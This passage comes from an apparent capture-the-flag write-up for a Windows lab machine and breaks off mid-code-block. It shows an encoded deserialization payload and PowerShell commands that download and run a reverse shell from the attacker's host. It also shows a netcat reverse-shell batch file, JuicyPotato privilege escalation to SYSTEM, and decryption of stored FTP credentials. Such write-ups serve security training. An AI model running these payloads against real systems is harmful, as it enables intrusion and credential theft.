<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>We have now a base64 payload for the Bearer:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@6274ae97a895:~/json/ysoserial.net$ cat payload.json | jq -c <span style="color:#f1fa8c">&#39;&#39;</span> | base64 -w <span style="color:#bd93f9">0</span> ; <span style="color:#8be9fd;font-style:italic">echo</span> -n
<span style="color:#8be9fd;font-style:italic">eyIkdHlwZSI6IlN5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1IiwiTWV0aG9kTmFtZSI6IlN0YXJ0IiwiTWV0aG9kUGFyYW1ldGVycyI6eyIkdHlwZSI6IlN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSIsIiR2YWx1ZXMiOlsiY21kIiwiL2Nwb3dlcnNoZWxsICAtdyBoaWRkZW4gLW5vbmkgLW5vcCAtYyBcIklFWChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLmRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTAuMTAuMTUuMTc2OjgwODAvSW52b2tlLVBvd2VyU2hlbGxUY3AucHMxJyk7SW52b2tlLVBvd2VyU2hlbGxUY3AgLVJldmVyc2UgLUlQQWRkcmVzcyAxMC4xMC4xNS4xNzYgLVBvcnQgODAwMFwiIl19LCJPYmplY3RJbnN0YW5jZSI6eyIkdHlwZSI6IlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5In19Cg</span><span style="color:#ff79c6">==</span>
</code></pre></td></tr></table>
</div>
</div><p>We forward ports before we send the payload with Burp:<code>ssh username@localhost -L 10.10.15.176:8080:192.168.99.100:8080 -L 10.10.15.176:8000:192.168.99.100:8000</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; whoami
json<span style="color:#f1fa8c">\u</span>serpool
PS C:<span style="color:#f1fa8c">\w</span>indows<span style="color:#f1fa8c">\s</span>ystem32<span style="color:#f1fa8c">\i</span>netsrv&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               <span style="color:#8be9fd;font-style:italic">State</span>
<span style="color:#ff79c6">=============================</span> <span style="color:#ff79c6">=========================================</span> <span style="color:#ff79c6">========</span>
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas <span style="color:#ff79c6">for</span> a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span style="color:#8be9fd;font-style:italic">set</span>            Disabled
</code></pre></td></tr></table>
</div>
</div><p>We get the user flag</p>
<h1 id="beyond-root">Beyond root</h1>
<h2 id="juicypotato-root-privilege-escalation">JuicyPotato Root Privilege Escalation</h2>
<p>Having SeImpersonatePrivilege and SeAssignPrimaryToken together enable <a href="https://github.com/ohpe/juicy-potato.git">Juicy-Potato</a> attack for root privilege escalation.
we can compile it from source but it requires a windows VM, so it is easier to download the <a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe">release</a></p>
<p>we need to find the CSLIDs of the machine, using this script: <a href="https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1">GetCLSID.ps1</a>
There is a better script <a href="https://raw.githubusercontent.com/ohpe/juicy-potato/master/Test/test_clsid.bat">test_clsid.bat</a> which will try all CLSID from, this list <a href="https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/Windows_Server_2012_Datacenter/CLSID.list">CLSID.list</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">{</span>e60687f7-01a1-40aa-86ac-db1cbf673334<span style="color:#ff79c6">}</span>

PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\M</span>usic&gt; <span style="color:#8be9fd;font-style:italic">$env</span>:PROCESSOR_ARCHITECTURE
AMD64
</code></pre></td></tr></table>
</div>
</div><p>Juicy-Potato is required to be launched from cmd.exe as it is not powershell-friendly,so the below cannot work :(</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># WRONG : we have to use a *.bat file</span>
cmd /c juicypotato.exe -t * -p <span style="color:#f1fa8c">&#34;c:/windows/system32/cmd.exe /C powershell.exe -w hidden -noni -nop -encodedcommand IgBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQA3ADYAOgA4ADAAOAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAJwApADsASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBSAGUAdgBlAHIAcwBlACAALQBJAFAAQQBkAGQAcgBlAHMAcwAgADEAMAAuADEAMAAuADEANQAuADEANwA2ACAALQBQAG8AcgB0ACAAOAAwADAAMAAiAAoA&#34;</span> -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{e60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>So we download a <a href="https://github.com/int0x33/nc.exe">netcat binary</a> and we prepare a *.bat reverse shell</p>
<pre tabindex="0"><code>#reverse.bat
\users\userpool\music\nc64.exe -e cmd.exe 10.10.14.70 8000
</code></pre><p>We launch our exploit</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; wget -outfile reverse.bat http://10.10.14.70:8080/reverse.bat
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; wget -outfile juicypotato.exe http://10.10.14.70:8080/JuicyPotato.exe
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; wget -outfile nc64.exe http://10.10.14.70:8080/nc64.exe
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt; cmd /c juicypotato.exe -t * -p <span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic<span style="color:#f1fa8c">\r</span>everse.bat -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{E60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
Testing <span style="color:#ff79c6">{</span>E60687f7-01a1-40aa-86ac-db1cbf673334<span style="color:#ff79c6">}</span> <span style="color:#bd93f9">1000</span>
....
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> authresult <span style="color:#bd93f9">0</span>
<span style="color:#ff79c6">{</span>E60687f7-01a1-40aa-86ac-db1cbf673334<span style="color:#ff79c6">}</span>;NT AUTHORITY<span style="color:#f1fa8c">\S</span>YSTEM

<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> CreateProcessWithTokenW OK
PS C:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic&gt;
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
ctf@6274ae97a895:~/json$ rlwrap nc -lnvp <span style="color:#bd93f9">8000</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8000</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">53578</span>
Microsoft Windows <span style="color:#ff79c6">[</span>Version 6.3.9600<span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2013</span> Microsoft Corporation. All rights reserved.

C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt;cd ../../Users/superadmin/Desktop
<span style="color:#8be9fd;font-style:italic">cd</span> ../../Users/superadmin/Desktop

C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>uperadmin<span style="color:#f1fa8c">\D</span>esktop&gt;type root.txt
<span style="color:#8be9fd;font-style:italic">type</span> root.txt
3cc*************************d441
C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>uperadmin<span style="color:#f1fa8c">\D</span>esktop&gt;
</code></pre></td></tr></table>
</div>
</div><p>We now have the flag :)</p>
<h3 id="juicypotato-working-syntax">JuicyPotato working Syntax</h3>
<p>WORKING COMMAND LINE</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cmd /c juicypotato.exe -t * -p <span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic<span style="color:#f1fa8c">\r</span>everse.bat -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{E60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
cmd /c juicypotato.exe -t * -p c:<span style="color:#f1fa8c">\u</span>sers<span style="color:#f1fa8c">\u</span>serpool<span style="color:#f1fa8c">\m</span>usic<span style="color:#f1fa8c">\r</span>everse.bat -l <span style="color:#bd93f9">1000</span> -c <span style="color:#f1fa8c">&#34;{E60687f7-01a1-40aa-86ac-db1cbf673334}&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>working reverse.bat batch file:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-reverse.bat" data-lang="reverse.bat">\users\userpool\music\nc64.exe -e cmd.exe 10.10.14.70 8000
c:<span style="color:#8be9fd;font-style:italic">\users\userpool\music\nc64.exe</span><span style="color:#6272a4"> -e cmd.exe 10.10.14.70 8000</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="beyond-root-exploiting-sync2ftp-to-find-the-superadmin-password">Beyond root: Exploiting Sync2Ftp to find the superadmin password</h2>
<p>Download the Sync2Ftp* files in ProgramFiles</p>
<p>The configuration contains the username and password but it is encrypted
<!-- raw HTML omitted -->
<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
<p>The exe is dotNet file, so we shoud be able to audit and change the code</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">file SyncLocation.exe
SyncLocation.exe: PE32 executable <span style="color:#ff79c6">(</span>GUI<span style="color:#ff79c6">)</span> Intel <span style="color:#bd93f9">80386</span> Mono/.Net assembly, <span style="color:#ff79c6">for</span> MS Windows
</code></pre></td></tr></table>
</div>
</div><p>upload those file in CommandoVM to decompile with dnsSpy</p>
<p>We can edit and save the source code to pop-up a MessageBox</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Java" data-lang="Java"><span style="color:#ff79c6">[..]</span>
using System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Configuration</span><span style="color:#ff79c6">;</span>
using System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Windows</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Forms</span><span style="color:#ff79c6">;</span>

namespace SyncLocation
<span style="color:#ff79c6">{</span>
	<span style="color:#6272a4">// Token: 0x02000005 RID: 5
</span><span style="color:#6272a4"></span>	internal <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Program</span>
	<span style="color:#ff79c6">{</span>
		<span style="color:#6272a4">// Token: 0x0600000F RID: 15
</span><span style="color:#6272a4"></span>		<span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">Main</span><span style="color:#ff79c6">()</span>
		<span style="color:#ff79c6">{</span>
			string cipherString3 <span style="color:#ff79c6">=</span> ConfigurationManager<span style="color:#ff79c6">.</span><span style="color:#50fa7b">AppSettings</span><span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#34;user&#34;</span><span style="color:#ff79c6">];</span>
			string cipherString2 <span style="color:#ff79c6">=</span> ConfigurationManager<span style="color:#ff79c6">.</span><span style="color:#50fa7b">AppSettings</span><span style="color:#ff79c6">[</span><span style="color:#f1fa8c">&#34;password&#34;</span><span style="color:#ff79c6">];</span>
			string str <span style="color:#ff79c6">=</span> Crypto<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Decrypt</span><span style="color:#ff79c6">(</span>cipherString3<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
			string password <span style="color:#ff79c6">=</span> Crypto<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Decrypt</span><span style="color:#ff79c6">(</span>cipherString2<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">);</span>
			MessageBox<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Show</span><span style="color:#ff79c6">(</span>str <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;:&#34;</span> <span style="color:#ff79c6">+</span> password<span style="color:#ff79c6">);</span>
            <span style="color:#ff79c6">[..]</span>
		<span style="color:#ff79c6">}</span>
	<span style="color:#ff79c6">}</span>
<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>The user and password are <code>superadmin:funnyhtb</code></p>
<p>We can now connect the ftp server. Because we are behind a NAT and a firewall,
we have to connect in passive mode, otherwise our ftp client will send the internal and non-reachable IP address.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
